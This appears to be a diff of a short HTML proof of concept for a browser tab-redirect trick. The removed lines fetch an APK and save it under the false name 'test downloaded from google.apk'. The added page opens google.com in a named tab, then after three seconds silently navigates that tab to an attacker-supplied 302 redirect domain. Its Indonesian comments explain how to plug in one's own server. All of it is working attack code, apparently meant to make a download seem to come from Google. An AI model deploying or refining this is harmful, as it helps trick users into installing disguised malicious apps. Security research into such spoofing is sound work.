@@ -1,14 +1,21 @@
-<button id="dl">Fetch & save as custom name</button>
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>PoC: open then redirect</title></head>
+<body>
+  <h2>Open then redirect PoC</h2>
+  <p>1) This opens a new tab to google.com, waits 3s, then navigates that same tab to the 302 endpoint.</p>
+  <p><button id="start">Start PoC</button></p>
+
 <script>
-document.getElementById('dl').addEventListener('click', async () => {
-  const res = await fetch('/test.apk');
-  const blob = await res.blob();
-  const url = URL.createObjectURL(blob);
-  const a = document.createElement('a');
-  a.href = url;
-  a.download = 'test downloaded from google.apk'; // <-- set custom name
-  document.body.appendChild(a);
-  a.click();
-  URL.revokeObjectURL(url);
+document.getElementById('start').addEventListener('click', () => {
+  // buka google di tab bernama 'x'
+  window.open('https://www.google.com', 'x');
+  // setelah delay, navigasi tab 'x' ke redirect endpoint
+  setTimeout(() => {
+    // ganti example-redirect.com dengan domain yang kamu deploy server 302
+    window.open('https://your-redirect-domain.example/go', 'x');
+  }, 3000);
 });
 </script>
+</body>
+</html>
